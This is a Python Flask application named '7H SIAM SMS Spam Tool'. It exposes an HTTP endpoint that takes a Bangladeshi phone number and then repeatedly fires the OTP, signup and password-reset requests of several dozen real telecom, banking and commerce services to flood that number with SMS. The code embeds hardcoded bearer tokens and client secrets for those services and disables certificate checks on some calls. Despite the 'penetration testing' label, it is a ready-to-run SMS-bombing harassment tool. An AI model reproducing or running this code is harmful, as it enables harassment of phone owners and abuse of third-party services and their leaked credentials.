#!/usr/bin/env python3
"""
===============================================
    7H SIAM SMS Spam Tool - Flask API Edition
    Modified for Penetration Testing
    Version: 2.0
===============================================
"""

import os
import sys
import time
import json
import requests
import threading
from flask import Flask, request, jsonify
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from rich import print as rprint
from rich.live import Live
from rich.text import Text
from datetime import datetime
import urllib3
import queue

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize Flask app and Rich console
app = Flask(__name__)
console = Console()
running_attacks = {}
attack_queue = queue.Queue()

# Color scheme
class Colors:
    PRIMARY = "cyan"
    SECONDARY = "yellow"
    SUCCESS = "green"
    ERROR = "red"
    WARNING = "yellow"
    INFO = "blue"
    HIGHLIGHT = "magenta"

# User Agents
USER_AGENTS = {
    "chrome_win": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "firefox": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "android": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36",
    "iphone": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15"
}

class LCCYBERZONE:
    def __init__(self):
        self.total_apis = 60
        self.apis = [
            ("PaperFly", self.api_paperfly),
            ("Ghoori", self.api_ghoori),
            ("Doctime", self.api_doctime),
            ("Sundarban", self.api_sundarban),
            ("Apex4U", self.api_apex4u),
            ("Robi", self.api_robi),
            ("Banglalink", self.api_banglalink),
            ("Banglalink OTP", self.api_banglalink_otp),
            ("Grameenphone", self.api_grameenphone),
            ("Robi Offer", self.api_robi_offer),
            ("Robi DA", self.api_robi_da),
            ("Robi Chat", self.api_robi_chat),
            ("Redx", self.api_redx),
            ("Fundesh", self.api_fundesh),
            ("Bikroy", self.api_bikroy),
            ("MotionView", self.api_motionview),
            ("Chorki", self.api_chorki),
            ("Jatri", self.api_jatri),
            ("ChinaOnline", self.api_chinaonline),
            ("Deepto", self.api_deepto),
            ("Shikho", self.api_shikho),
            ("Redx Signup", self.api_redx_signup),
            ("Bioscope", self.api_bioscope),
            ("Binge", self.api_binge),
            ("AppLink", self.api_applink),
            ("Chokrojan", self.api_chokrojan),
            ("Dhaka Bank", self.api_dhakabank),
            ("Easy", self.api_easy),
            ("Eshop", self.api_eshop),
            ("FSIBL", self.api_fsibl),
            ("MyGP", self.api_mygp),
            ("GP Shop", self.api_gp_shop),
            ("Hishabee", self.api_hishabee),
            ("Iqra", self.api_iqra),
            ("Robi Smart", self.api_robi_smart),
            ("MCB", self.api_mcb),
            ("Mithai", self.api_mithai),
            ("EnglishMoja", self.api_englishmoja),
            ("MoveOn", self.api_moveon),
            ("OshudPotro", self.api_oshudpotro),
            ("MyGP Login", self.api_mygp_login),
            ("Qcoom", self.api_qcoom),
            ("Circle", self.api_circle),
            ("Shomvob", self.api_shomvob),
            ("ToyBox", self.api_toybox),
            ("Win2Gain", self.api_win2gain),
            ("Kepler", self.api_kepler),
            ("Roots Edu", self.api_roots_edu),
            ("Roots Forget", self.api_roots_forget),
        ]
    
    def make_request(self, func_name, request_func, number):
        """Make API request silently"""
        try:
            request_func(number)
            return True
        except Exception:
            return False

    def run_spam_cycle(self, number, cycle_id, result_queue):
        """Run one complete spam cycle in background"""
        success_count = 0
        fail_count = 0
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console,
            transient=True
        ) as progress:
            
            for i, (name, func) in enumerate(self.apis[:self.total_apis]):
                task = progress.add_task(f"[cyan]{name}", total=1)
                if self.make_request(name, func, number):
                    success_count += 1
                    progress.update(task, advance=1, description=f"[green]✓ {name}[/green]")
                else:
                    fail_count += 1
                    progress.update(task, advance=1, description=f"[red]✗ {name}[/red]")
        
        result_queue.put({
            'cycle': cycle_id,
            'success': success_count,
            'failed': fail_count,
            'total': self.total_apis,
            'status': 'completed'
        })

    def start_background_attack(self, number, amount, request_id):
        """Start attack in background thread"""
        console.print(f"\n[bold {Colors.SUCCESS}]🚀 Attack Started[/bold {Colors.SUCCESS}]")
        console.print(f"[bold {Colors.PRIMARY}]Target: +88{number} | Cycles: {amount} | Request ID: {request_id}[/bold {Colors.PRIMARY}]")
        
        def attack_worker():
            result_queue = queue.Queue()
            running_attacks[request_id] = {
                'status': 'running',
                'number': number,
                'amount': amount,
                'progress': 0,
                'success_total': 0,
                'failed_total': 0,
                'start_time': time.time()
            }
            
            for cycle in range(1, amount + 1):
                if request_id not in running_attacks:
                    break
                    
                running_attacks[request_id]['progress'] = (cycle-1) / amount * 100
                cycle_thread = threading.Thread(
                    target=self.run_spam_cycle, 
                    args=(number, cycle, result_queue)
                )
                cycle_thread.start()
                cycle_thread.join()
                
                if not result_queue.empty():
                    cycle_result = result_queue.get()
                    running_attacks[request_id]['success_total'] += cycle_result['success']
                    running_attacks[request_id]['failed_total'] += cycle_result['failed']
            
            elapsed = time.time() - running_attacks[request_id]['start_time']
            running_attacks[request_id] = {
                **running_attacks[request_id],
                'status': 'completed',
                'progress': 100,
                'elapsed': elapsed
            }
            console.print(f"[bold green]✅ Attack {request_id} COMPLETED[/bold green]")
        
        thread = threading.Thread(target=attack_worker)
        thread.daemon = True
        thread.start()

    # All API functions (same as original)
    def api_paperfly(self, number):
        headers = {'accept': 'application/json', 'content-type': 'application/json'}
        json_data = {'full_name': 'Test User', 'company_name': 'Test Co', 
                    'email_address': 'test@email.com', 'phone_number': number}
        requests.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_ghoori(self, number):
        headers = {'accept': 'application/json', 'content-type': 'application/json'}
        json_data = {'mobile_no': number}
        requests.post('https://api.ghoorilearning.com/api/auth/signup/otp', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_doctime(self, number):
        headers = {'accept': 'application/json', 'content-type': 'application/json'}
        json_data = {'data': {'country_calling_code': '88', 'contact_no': number}}
        requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_sundarban(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'operationName': 'CreateAccessToken', 
                    'variables': {'accessTokenFilter': {'userName': number}},
                    'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter } } }'}
        requests.post('https://api-gateway.sundarbancourierltd.com/graphql', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_apex4u(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'phoneNumber': number}
        requests.post('https://api.apex4u.com/api/auth/login', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_robi(self, number):
        headers = {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc', 
                  'Content-Type': 'application/json'}
        data = {'phone_number': number, 'type': 'doorstep'}
        requests.post('https://webapi.robi.com.bd/v1/send-otp', json=data, headers=headers, timeout=5)
    
    def api_banglalink(self, number):
        requests.get('https://web-api.banglalink.net/api/v1/user/number/validation/'+number, timeout=5)
    
    def api_banglalink_otp(self, number):
        headers = {'client-security-token': '1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ'}
        json_data = {'mobile': number}
        requests.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', headers=headers, json=json_data, timeout=5)
    
    def api_grameenphone(self, number):
        data = {'msisdn': number}
        requests.post('https://webloginda.grameenphone.com/backend/api/v1/otp', data=data, timeout=5)
    
    def api_robi_offer(self, number):
        headers = {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI'}
        json_data = {'phone_number': number, 'type': 'my_offer'}
        requests.post('https://webapi.robi.com.bd/v1/send-otp', headers=headers, json=json_data, timeout=5)
    
    def api_robi_da(self, number):
        data = {'msisdn': number}
        requests.post('https://da-api.robi.com.bd/da-nll/otp/send', json=data, timeout=5)
    
    def api_robi_chat(self, number):
        headers = {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI'}
        json_data = {'phone_number': number, 'name': 'Test User', 'type': 'video-chat'}
        requests.post('https://webapi.robi.com.bd/v1/chat/send-otp', headers=headers, json=json_data, timeout=5)
    
    def api_redx(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'phoneNumber': number}
        requests.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_fundesh(self, number):
        headers = {'content-type': 'application/json; charset=UTF-8'}
        json_data = {'msisdn': number}
        requests.post('https://fundesh.com.bd/api/auth/generateOTP', headers=headers, json=json_data, timeout=5)
    
    def api_bikroy(self, number):
        requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', 
                    params={'phone': number}, timeout=5)
    
    def api_motionview(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'phone': number}
        requests.post('https://api.motionview.com.bd/api/send-otp-phone-signup', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_chorki(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'number': '+88'+number}
        requests.post('https://api-dynamic.chorki.com/v2/auth/login', 
                     params={'country': 'BD', 'platform': 'web'}, 
                     headers=headers, json=json_data, timeout=5)
    
    def api_jatri(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'phone': '+88'+number, 'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'}
        requests.post('https://user-api.jslglobal.co:444/v2/send-otp', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_chinaonline(self, number):
        requests.get('https://chinaonlinebd.com/api/login/getOtp', params={'phone': number}, timeout=5)
    
    def api_deepto(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'number': '+88'+number}
        requests.post('https://api.deeptoplay.com/v2/auth/login', 
                     params={'country': 'BD', 'platform': 'web'}, 
                     headers=headers, json=json_data, timeout=5)
    
    def api_shikho(self, number):
        headers = {'content-type': 'application/json'}
        json_data = {'phone': number, 'type': 'student', 'auth_type': 'signup', 'vendor': 'shikho'}
        requests.post('https://api.shikho.com/auth/v2/send/sms', 
                     headers=headers, json=json_data, timeout=5)
    
    def api_redx_signup(self, number):
        headers = {'content-type': 'application/json'}
        data = '{"name":"Test User","phoneNumber":"'+number+'","service":"redx"}'
        requests.post('https://api.redx.com.bd/v1/user/signup', headers=headers, data=data, timeout=5)
    
    def api_bioscope(self, number):
        requests.post('https://www.bioscopelive.com/en/login/send-otp?phone=88'+number+'&operator=bd-otp', timeout=5)
    
    def api_binge(self, number):
        requests.post('https://ss.binge.buzz/otp/send/login'+number, timeout=5)
    
    def api_applink(self, number):
        headers = {'content-type': 'application/json'}
        data = {'msisdn': '88'+number}
        requests.post('https://applink.com.bd/appstore-v4-server/login/otp/request', 
                     headers=headers, json=data, verify=False, timeout=5)
    
    def api_chokrojan(self, number):
        headers = {'content-type': 'application/json', 'domain-name': 'chokrojan.com', 'user-platform': '3'}
        data = {'mobile_number': number}
        requests.post('https://chokrojan.com/api/v1/passenger/login/mobile', 
                     headers=headers, json=data, timeout=5)
    
    def api_dhakabank(self, number):
        headers = {'content-type': 'application/json'}
        data = {'mobileNo': number, 'product_id': '250', 'requestChannel': 'MOB', 'trackingStatus': 5}
        requests.post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber', 
                     headers=headers, json=data, verify=False, timeout=5)
    
    def api_easy(self, number):
        headers = {'content-type': 'application/json'}
        data = {'name': 'Test User', 'email': 'test@email.com', 'mobile': number, 
                'password': 'pass123', 'password_confirmation': 'pass123', 'device_key': 'test123'}
        requests.post('https://core.easy.com.bd/api/v1/registration', 
                     headers=headers, json=data, timeout=5)
    
    def api_eshop(self, number):
        headers = {'content-type': 'application/json'}
        data = {'type': 'phone', 'phone': number}
        requests.post('https://eshop-api.banglalink.net/api/v1/customer/send-otp', 
                     headers=headers, json=data, timeout=5)
    
    def api_fsibl(self, number):
        headers = {'content-type': 'application/json'}
        data = {'mobileNo': number, 'product_id': '122', 'requestChannel': 'MOB', 'trackingStatus': 5}
        requests.post('https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber', 
                     headers=headers, json=data, timeout=5)
    
    def api_mygp(self, number):
        headers = {'content-type': 'application/json'}
        data = {'accessinfo': {'access_token': 'K165S6V6q4C6G7H0y9C4f5W7t5YeC6', 'referenceCode': '20190827042622'}}
        requests.post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{number}/SBENT_3GB7D', 
                     headers=headers, json=data, timeout=5)
    
    def api_gp_shop(self, number):
        headers = {'content-type': 'application/json'}
        data = {'phone': number, 'email': '', 'language': 'en'}
        requests.post('https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', 
                     headers=headers, json=data, timeout=5)
    
    def api_hishabee(self, number):
        requests.post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={number}', timeout=5)
    
    def api_iqra(self, number):
        requests.get(f'http://apibeta.iqra-live.com/api/v1/sent-otp/{number}', verify=False, timeout=5)
    
    def api_robi_smart(self, number):
        number = number.lstrip('0')
        data = {'cli': number}
        requests.post('https://smart1216.robi.com.bd/robi_sivr/public/login/phone', 
                     json=data, timeout=5)
    
    def api_mcb(self, number):
        data = {'PhoneNumber': number}
        requests.post('https://www.mcbaffiliate.com/Affiliate/RequestOTP', 
                     data=data, timeout=5)
    
    def api_mithai(self, number):
        headers = {'Authorization': 'Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ=='}
        data = {'phone': number, 'email': f'test{number}@gmail.com', 'password1': 'Pass123@', 
                'password2': 'Pass123@', 'company_id': '2', 'storefront_id': '5'}
        requests.post('https://mithaibd.com/api/login/', headers=headers, json=data, timeout=5)
    
    def api_englishmoja(self, number):
        data = {'phone': '+88'+number}
        requests.post('https://api.englishmojabd.com/api/v1/auth/login', 
                     json=data, timeout=5)
    
    def api_moveon(self, number):
        headers = {'content-type': 'application/json'}
        data = {'phone': number}
        requests.post('https://moveon.com.bd/api/v1/customer/auth/phone/request-otp', 
                     headers=headers, json=data, timeout=5)
    
    def api_oshudpotro(self, number):
        headers = {'content-type': 'application/json'}
        data = {'mobile': '+88-'+number, 'deviceToken': 'app', 'language': 'bn', 'os': 'android'}
        requests.post('https://api.osudpotro.com/api/v1/users/send_otp', 
                     headers=headers, json=data, timeout=5)
    
    def api_mygp_login(self, number):
        requests.get(f'https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{number}&lang=en', timeout=5)
    
    def api_qcoom(self, number):
        headers = {'content-type': 'application/json'}
        data = {'mobileNumber': '+88'+number}
        requests.post('https://auth.qcoom.com/api/v1/otp/send', 
                     headers=headers, json=data, timeout=5)
    
    def api_circle(self, number):
        headers = {'content-type': 'application/json'}
        data = {'name': '+88'+number, 'email_or_phone': '+88'+number, 
                'password': 'pass123', 'password_confirmation': 'pass123', 'register_by': 'phone'}
        requests.post('https://reseller.circle.com.bd/api/v2/auth/signup', 
                     headers=headers, json=data, timeout=5)
    
    def api_shomvob(self, number):
        headers = {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s'}
        data = {'phone': number}
        requests.post('https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', 
                     headers=headers, json=data, timeout=5)
    
    def api_toybox(self, number):
        data = {'Operation': 'CreateSubscription', 'MobileNumber': '88'+number, 
                'PackageID': 100, 'Secret': 'HJKX71%UHYH'}
        requests.post('https://api.toybox.live/bdapps_handler.php', 
                     json=data, timeout=5)
    
    def api_win2gain(self, number):
        headers = {'sourcePlatform': 'web', 'client': '2'}
        requests.get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{number}', 
                    headers=headers, timeout=5)
    
    def api_kepler(self, number):
        data = {'deviceId': 'test123', 'deviceInfo': {'deviceInfoSignature': 'test', 'deviceId': 'test123'},
                'operator': 'Gp', 'walletNumber': number}
        requests.post('https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp', 
                     json=data, timeout=5)
    
    def api_roots_edu(self, number):
        data = {'name': 'Test User', 'phone': f'88{number}', 'email': f'test{number}@email.com', 
                'password': 'pass123', 'confirmPassword': 'pass123'}
        requests.post('https://rootsedulive.com/api/auth/register', 
                     data=data, timeout=5)
    
    def api_roots_forget(self, number):
        data = {'phoneOrEmail': f'88{number}'}
        requests.post('https://rootsedulive.com/api/auth/forget-password', 
                     data=data, timeout=5)

# Global tool instance
tool = LCCYBERZONE()

@app.route('/request', methods=['GET'])
def start_attack():
    """Main API endpoint: https://localhost:5000/request?number=017XXXXXXXX&cycle=5"""
    try:
        number = request.args.get('number')
        cycle = request.args.get('cycle', '1')
        
        # Validate number (11 digits)
        if not number or not number.isdigit() or len(number) != 11:
            return jsonify({
                'status': 'error',
                'message': 'Invalid number! Must be 11 digits (e.g., 01712345678)',
                'request_id': None
            }), 400
        
        # Validate cycle
        try:
            cycle_count = int(cycle)
            if cycle_count <= 0:
                raise ValueError()
        except ValueError:
            return jsonify({
                'status': 'error',
                'message': 'Invalid cycle count! Must be positive integer',
                'request_id': None
            }), 400
        
        # Generate unique request ID
        request_id = f"ATTACK_{int(time.time())}_{number[:4]}"
        
        # Start background attack after 1 second delay
        def delayed_start():
            time.sleep(1)
            tool.start_background_attack(number, cycle_count, request_id)
        
        threading.Thread(target=delayed_start, daemon=True).start()
        
        # Immediate response (within 1 second)
        return jsonify({
            'status': 'success',
            'message': f'🚀 Attack initiated! Target: +88{number}, Cycles: {cycle_count}, APIs/Cycle: {tool.total_apis}, Total SMS: {cycle_count * tool.total_apis}',
            'request_id': request_id,
            'target': f'+88{number}',
            'cycles': cycle_count,
            'total_sms_expected': cycle_count * tool.total_apis,
            'progress_url': f'/status/{request_id}'
        }), 200
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Server error: {str(e)}',
            'request_id': None
        }), 500

@app.route('/status/<request_id>', methods=['GET'])
def get_status(request_id):
    """Check attack status"""
    attack = running_attacks.get(request_id)
    if not attack:
        return jsonify({
            'status': 'not_found',
            'message': f'Attack {request_id} not found or completed',
            'request_id': request_id
        }), 404
    
    return jsonify({
        'status': attack['status'],
        'request_id': request_id,
        'progress': attack.get('progress', 0),
        'success_total': attack.get('success_total', 0),
        'failed_total': attack.get('failed_total', 0),
        'target': attack.get('number'),
        'cycles': attack.get('amount'),
        'elapsed': attack.get('elapsed', time.time() - attack.get('start_time', time.time()))
    })

@app.route('/', methods=['GET'])
def home():
    """API Documentation"""
    banner = """
     ███████╗ ██╗  ██╗     ███████╗ ██╗  █████╗  ███╗   ███╗
     ╚════██║ ██║  ██║     ██╔════╝ ██║ ██╔══██╗ ████╗ ████║
         ██╔╝ ███████║     ███████╗ ██║ ███████║ ██╔████╔██║
        ██╔╝  ██╔══██║     ╚════██║ ██║ ██╔══██║ ██║╚██╔╝██║
        ██║   ██║  ██║     ███████║ ██║ ██║  ██║ ██║ ╚═╝ ██║
        ╚═╝   ╚═╝  ╚═╝     ╚══════╝ ╚═╝ ╚═╝  ╚═╝ ╚═╝     ╚═╝
    """
    return f"""
    <html>
    <head><title>7H SIAM SMS Spam API v2.0</title>
    <style>
        body {{ font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }}
        .endpoint {{ background: #333; padding: 15px; margin: 10px 0; border-left: 4px solid #00ff00; }}
        pre {{ background: #000; padding: 10px; overflow-x: auto; }}
    </style>
    </head>
    <body>
        <pre>{banner}</pre>
        <h2>🚀 API Endpoints</h2>
        
        <div class="endpoint">
            <h3>📱 Start Attack</h3>
            <pre>GET /request?number=01712345678&cycle=5</pre>
            <p><strong>Total SMS:</strong> 5 cycles × 60 APIs = 300 SMS</p>
        </div>
        
        <div class="endpoint">
            <h3>📊 Check Status</h3>
            <pre>GET /status/{request_id}</pre>
        </div>
        
        <div class="endpoint">
            <h3>🏠 Home</h3>
            <pre>GET /</pre>
        </div>
        
        <h2>💡 Example Usage</h2>
        <pre>
curl "http://localhost:5000/request?number=01712345678&cycle=3"
curl "http://localhost:5000/status/ATTACK_1737123456_0171"
        </pre>
        
        <p><strong>⚠️ Response within 1 second, attack runs in background!</strong></p>
    </body>
    </html>
    """

def display_banner():
    """Display startup banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    console.print("""
[bold cyan]
     ███████╗ ██╗  ██╗     ███████╗ ██╗  █████╗  ███╗   ███╗
     ╚════██║ ██║  ██║     ██╔════╝ ██║ ██╔══██╗ ████╗ ████║
         ██╔╝ ███████║     ███████╗ ██║ ███████║ ██╔████╔██║
        ██╔╝  ██╔══██║     ╚════██║ ██║ ██╔══██║ ██║╚██╔╝██║
        ██║   ██║  ██║     ███████║ ██║ ██║  ██║ ██║ ╚═╝ ██║
        ╚═╝   ╚═╝  ╚═╝     ╚══════╝ ╚═╝ ╚═╝  ╚═╝ ╚═╝     ╚═╝
[/bold cyan]

[bold green]🎯 Flask API Server Started Successfully![/bold green]
[bold yellow]📡 API Endpoints:[/bold yellow]
[cyan]➤[/cyan] http://localhost:5000/request?number=017XXXXXXXX&cycle=5
[cyan]➤[/cyan] http://localhost:5000/status/{request_id}
[cyan]➤[/cyan] http://localhost:5000/ (Documentation)

[bold magenta]⚡ Response within 1 second | Background Attack | 60 APIs/Cycle[/bold magenta]
    """)

if __name__ == "__main__":
    # Install requirements if missing
    required_packages = ['rich', 'requests', 'flask']
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            console.print(f"[yellow]Installing {package}...[/yellow]")
            os.system(f"pip install {package}")
    
    display_banner()
    console.print("[bold green]Server running on http://0.0.0.0:5000[/bold green]")
    console.print("[bold yellow]Press Ctrl+C to stop[/bold yellow]\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)